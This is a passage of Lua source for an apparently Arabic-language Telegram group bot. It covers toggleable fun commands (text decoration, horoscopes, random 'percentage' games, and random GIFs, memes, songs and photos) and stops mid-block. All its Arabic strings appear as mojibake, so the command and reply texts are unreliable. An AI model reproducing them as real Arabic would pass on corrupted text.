if text == 'ุฒุฎุฑูู' and ChCheck(msg) or text == 'ุงูุฒุฎุฑูู' and ChCheck(msg) then  
DevRio:setex(Rinda.."Zrf:Rio"..msg.chat_id_..msg.sender_user_id_,300,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุฑุณู ูู ุงููููู ูุฒุฎุฑูุชูุง \nููููู ุงูุฒุฎุฑูุฉ ุจุงููุบู { en } ~ { ar } ', 1, 'md')
end
end
if not DevRio:get(Rinda..'Rio:Zrf:Rio'..msg.chat_id_) then
if text and text:match("^ุฒุฎุฑูู (.*)$") and ChCheck(msg) or text and text:match("^ุฒุฎุฑู (.*)$") and ChCheck(msg) then 
local TextZrf = text:match("^ุฒุฎุฑูู (.*)$") or text:match("^ุฒุฎุฑู (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "โ๏ธฐูุงุฆูุฉ ุงูุฒุฎุฑูู โข โค\n-----------------------------------------\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ุงูุงุจุฑุงุฌ" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงุจุฑุงุฌ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Brg:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุงูุงุจุฑุงุฌ" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงุจุฑุงุฌ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Brg:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Rinda..'Rio:Brg:Rio'..msg.chat_id_) then
if text and text:match("^ุจุฑุฌ (.*)$") and ChCheck(msg) or text and text:match("^ุจุฑุฌู (.*)$") and ChCheck(msg) then 
local TextBrg = text:match("^ุจุฑุฌ (.*)$") or text:match("^ุจุฑุฌู (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs  
Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == "ุชูุนูู ุงูุงูุฑ ุงููุณุจ" or text == "ุชูุนูู ูุณุจู ุงูุญุจ" or text == "ุชูุนูู ูุณุจู ุงููุฑู" or text == "ุชูุนูู ูุณุจู ุงูุฑุฌููู" or text == "ุชูุนูู ูุณุจู ุงูุงููุซู" or text == "ุชูุนูู ูุณุจู ุงูุบุจุงุก") and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงูุฑ ุงููุณุจ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Nsba:Rio'..msg.chat_id_) 
end
if text and (text == "ุชุนุทูู ุงูุงูุฑ ุงููุณุจ" or text == "ุชุนุทูู ูุณุจู ุงูุญุจ" or text == "ุชุนุทูู ูุณุจู ุงููุฑู" or text == "ุชุนุทูู ูุณุจู ุงูุฑุฌููู" or text == "ุชุนุทูู ูุณุจู ุงูุงููุซู" or text == "ุชุนุทูู ูุณุจู ุงูุบุจุงุก") and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงูุฑ ุงููุณุจ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Nsba:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Rinda..'Rio:Nsba:Rio'..msg.chat_id_) then
if text == "ูุณุจู ุงูุญุจ" and ChCheck(msg) or text == "ูุณุจุฉ ุงูุญุจ" and ChCheck(msg) then
DevRio:set(Rinda..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุงุฑุณู ุงุณููู ูุญุณุงุจ ูุณุจุฉ ุงูุญุจ ุจููููุง ููุซุงู โข ุฌุงู ู ุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุญุจ" and text ~= "ูุณุจุฉ ุงูุญุจ" and DevRio:get(Rinda..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุญุจ ', 1, 'md')
DevRio:del(Rinda..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุณุจุฉ ุงูุญุจ ุจูู '..text..' ูู : '..Rio..'%', 1, 'md')
DevRio:del(Rinda..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevRio:get(Rinda..'Rio:Nsba:Rio'..msg.chat_id_) then
if text == "ูุณุจู ุงูุฎูุงูู" and ChCheck(msg) or text == "ูุณุจุฉ ุงูุฎูุงูู" and ChCheck(msg) or text == "โข ูุณุจู ุงูุฎูุงูู โ" and ChCheck(msg) then
DevRio:set(Rinda..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุงุฑุณู ุงุณููู ูุญุณุงุจ ูุณุจุฉ ุงูุฎูุงูู ุจููููุง ููุซุงู โข ุฌุงู ู ุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุฎูุงูู" and text ~= "ูุณุจุฉ ุงูุฎูุงูู" and text ~= "โข ูุณุจู ุงูุฎูุงูู โ" and DevRio:get(Rinda..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุฎูุงูู ', 1, 'md')
DevRio:del(Rinda..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุณุจุฉ ุงูุฎูุงูู ุจูู '..text..' ูู : '..Rio..'%', 1, 'md')
DevRio:del(Rinda..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevRio:get(Rinda..'Rio:Nsba:Rio'..msg.chat_id_) then
if text and (text == "ูุณุจู ุงูุฌูุงู" or text == "ูุณุจุฉ ุงูุฌูุงู" or text == "โข ูุณุจู ุงูุฌูุงู โ") and ChCheck(msg) then
DevRio:set(Rinda..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุงุฑุณู ุงุณู ุงูุดุฎุต ูููุงุณ ูุณุจุฉ ุฌูุงูู ููุซุงู โข ุฌุงู ุงู ุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุฌูุงู" and text ~= "ูุณุจุฉ ุงูุฌูุงู" and text ~= "โข ูุณุจู ุงูุฌูุงู โ" and DevRio:get(Rinda..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุฌูุงู ', 1, 'md')
DevRio:del(Rinda..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุณุจุฉ ุฌูุงู '..text..' ูู : '..Rio..'%', 1, 'md')
DevRio:del(Rinda..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevRio:get(Rinda..'Rio:Nsba:Rio'..msg.chat_id_) then
if text == "ูุณุจู ุงููุฑู" and ChCheck(msg) or text == "ูุณุจุฉ ุงููุฑู" and ChCheck(msg) or text == "โข ูุณุจู ุงููุฑู โ" and ChCheck(msg) then
DevRio:set(Rinda..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุงุฑุณู ุงุณููู ูุญุณุงุจ ูุณุจุฉ ุงููุฑู ุจููููุง ููุซุงู โข ุฌุงู ู ุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงููุฑู" and text ~= "ูุณุจุฉ ุงููุฑู" and text ~= "โข ูุณุจู ุงููุฑู โ" and DevRio:get(Rinda..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงููุฑู ', 1, 'md')
DevRio:del(Rinda..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุณุจุฉ ุงููุฑู ุจูู '..text..' ูู : '..Rio..'%', 1, 'md')
DevRio:del(Rinda..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevRio:get(Rinda..'Rio:Nsba:Rio'..msg.chat_id_) then
if text and (text == "ูุณุจู ุงูุฑุฌููู" or text == "ูุณุจุฉ ุงูุฑุฌููู" or text == "ูุณุจู ุฑุฌููู" or text == "ูุณุจุฉ ุฑุฌููู" or text == "โข ูุณุจู ุงูุฑุฌููู โ") and ChCheck(msg) then
DevRio:set(Rinda..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุงุฑุณู ุงุณู ุงูุดุฎุต ูููุงุณ ูุณุจุฉ ุฑุฌููุชู ููุซุงู โข ุฌุงู', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุฑุฌููู" and text ~= "ูุณุจุฉ ุงูุฑุฌููู" and text ~= "ูุณุจู ุฑุฌููู" and text ~= "ูุณุจุฉ ุฑุฌููู" and text ~= "โข ูุณุจู ุงูุฑุฌููู โ" and DevRio:get(Rinda..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุฑุฌููู ', 1, 'md')
DevRio:del(Rinda..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุณุจุฉ ุฑุฌููุฉ '..text..' ูู : '..Rio..'%', 1, 'md')
DevRio:del(Rinda..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevRio:get(Rinda..'Rio:Nsba:Rio'..msg.chat_id_) then
if text and (text == "ูุณุจู ุงูุงููุซู" or text == "ูุณุจุฉ ุงูุงููุซู" or text == "ูุณุจู ุงููุซู" or text == "ูุณุจุฉ ุงููุซู" or text == "โข ูุณุจู ุงูุงููุซู โ") and ChCheck(msg) then
DevRio:set(Rinda..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุงุฑุณู ุงุณู ุงูุดุฎุต ูููุงุณ ูุณุจุฉ ุงููุซุชู ููุซุงู โข ุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุงููุซู" and text ~= "ูุณุจุฉ ุงูุงููุซู" and text ~= "ูุณุจู ุงููุซู" and text ~= "ูุณุจุฉ ุงููุซู" and text ~= "โข ูุณุจู ุงูุงููุซู โ" and DevRio:get(Rinda..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุงููุซู ', 1, 'md')
DevRio:del(Rinda..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุณุจุฉ ุงููุซุฉ '..text..' ูู : '..Rio..'%', 1, 'md')
DevRio:del(Rinda..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevRio:get(Rinda..'Rio:Nsba:Rio'..msg.chat_id_) then
if text and (text == "ูุณุจู ุงูุบุจุงุก" or text == "ูุณุจุฉ ุงูุบุจุงุก" or text == "โข ูุณุจู ุงูุบุจุงุก โ") and ChCheck(msg) then
DevRio:set(Rinda..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุงุฑุณู ุงุณู ุงูุดุฎุต ูููุงุณ ูุณุจุฉ ุบุจุงุฆู ููุซุงู โข ุฌุงู ุงู ุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุบุจุงุก" and text ~= "ูุณุจุฉ ุงูุบุจุงุก" and text ~= "โข ูุณุจู ุงูุบุจุงุก โ" and DevRio:get(Rinda..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุบุจุงุก ', 1, 'md')
DevRio:del(Rinda..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุณุจุฉ ุบุจุงุก '..text..' ูู : '..Rio..'%', 1, 'md')
DevRio:del(Rinda..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ุญุณุงุจ ุงูุนูุฑ" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุญุณุงุจ ุงูุนูุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Age:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุญุณุงุจ ุงูุนูุฑ" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุญุณุงุจ ุงูุนูุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Age:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Rinda..'Rio:Age:Rio'..msg.chat_id_) then
if text and text:match("^ุงุญุณุจ (.*)$") and ChCheck(msg) or text and text:match("^ุนูุฑู (.*)$") and ChCheck(msg) then 
local TextAge = text:match("^ุงุญุณุจ (.*)$") or text:match("^ุนูุฑู (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.abs
Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ูุนุงูู ุงูุงุณูุงุก" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ูุนุงูู ุงูุงุณูุงุก'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Mean:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ูุนุงูู ุงูุงุณูุงุก" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ูุนุงูู ุงูุงุณูุงุก'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Mean:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Rinda..'Rio:Mean:Rio'..msg.chat_id_) then
if text and text:match("^ูุนูู ุงูุงุณู (.*)$") and ChCheck(msg) or text and text:match("^ูุนูู ุงุณู (.*)$") and ChCheck(msg) then 
local TextMean = text:match("^ูุนูู ุงูุงุณู (.*)$") or text:match("^ูุนูู ุงุณู (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.abs
Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ูุชุญุฑูู" and Manager(msg) and ChCheck(msg) or text == "ุชูุนูู ุงููุชุญุฑูู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงููุชุญุฑูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:gif:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ูุชุญุฑูู" and Manager(msg) and ChCheck(msg) or text == "ุชุนุทูู ุงููุชุญุฑูู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงููุชุญุฑูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:gif:Rio'..msg.chat_id_,true)  
end
if text and (text == "ูุชุญุฑูู" or text == "โข ูุชุญุฑูู โ") and not DevRio:get(Rinda..'Rio:gif:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,1075); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงููุชุญุฑูู ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/gif:"..msg.sender_user_id_}},{{text = 'โข Rinda Team โข',url="t.me/Source_Rinda"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ูููุฒ" and Manager(msg) and ChCheck(msg) or text == "ุชูุนูู ุงููููุฒ" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงููููุฒ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:memz:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ูููุฒ" and Manager(msg) and ChCheck(msg) or text == "ุชุนุทูู ุงููููุฒ" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงููููุฒ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:memz:Rio'..msg.chat_id_,true)  
end
if text and (text == "ูููุฒ" or text == "โข ูููุฒ โ") and not DevRio:get(Rinda..'Rio:memz:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,1201); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ููุทุน ุงููููุฒ ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/memz:"..msg.sender_user_id_}},{{text = 'โข Rinda Team โข',url="t.me/Source_Rinda"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ุบูููู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุบูููู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Audios:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุบูููู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุบูููู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Audios:Rio'..msg.chat_id_,true)  
end
if text and (text == "ุบูููู" or text == "โข ุบูููู โ") and not DevRio:get(Rinda..'Rio:Audios:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(4,2824); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงูุงุบููู ุงุณูุน ูเขชูุญ ุจุงูู๐*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/Song:"..msg.sender_user_id_}},{{text = 'โข Rinda Team โข',url="t.me/Source_Rinda"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ุงูุงุบุงูู" and Manager(msg) and ChCheck(msg) or text == "ุชูุนูู ุงุบููู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงุบุงูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:mp3:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุงูุงุบุงูู" and Manager(msg) and ChCheck(msg) or text == "ุชุนุทูู ุงุบููู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงุบุงูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:mp3:Rio'..msg.chat_id_,true)  
end
if text and (text == "ุงุบููู" or text == "โข ุงุบููู โ" or text == "ุงุบุงูู") and not DevRio:get(Rinda..'Rio:mp3:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,1167); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงูุงุบููู ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/mp3:"..msg.sender_user_id_}},{{text = 'โข Rinda Team โข',url="t.me/Source_Rinda"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendAudio?chat_id=' .. msg.chat_id_ .. '&audio=https://t.me/DavidMp3/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ุฑูููุณ" and Manager(msg) and ChCheck(msg) or text == "ุชูุนูู ุงูุฑูููุณ" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุฑูููุณ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Remix:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุฑูููุณ" and Manager(msg) and ChCheck(msg) or text == "ุชุนุทูู ุงูุฑูููุณ" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุฑูููุณ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Remix:Rio'..msg.chat_id_,true)  
end
if text and (text == "ุฑูููุณ" or text == "โข ุฑูููุณ โ") and not DevRio:get(Rinda..'Rio:Remix:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,612); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงูุฑูููุณ ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/remix:"..msg.sender_user_id_}},{{text = 'โข Rinda Team โข',url="t.me/Source_Rinda"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ุตูุฑู" and Manager(msg) and ChCheck(msg) or text == "ุชูุนูู ุงูุตูุฑู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุตูุฑู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Photo:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุตูุฑู" and Manager(msg) and ChCheck(msg) or text == "ุชุนุทูู ุงูุตูุฑู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุตูุฑู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Photo:Rio'..msg.chat_id_,true)  
end
if text and (text == "ุตูุฑู" or text == "โข ุตูุฑู โ") and not DevRio:get(Rinda..'Rio:Photo:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(4,1171); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงูุตูุฑู ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/photo:"..msg.sender_user_id_}},{{text = 'โข Rinda Team โข',url="t.me/Source_Rinda"}}} 
local msg_id = msg.id_/2097152/0.5 
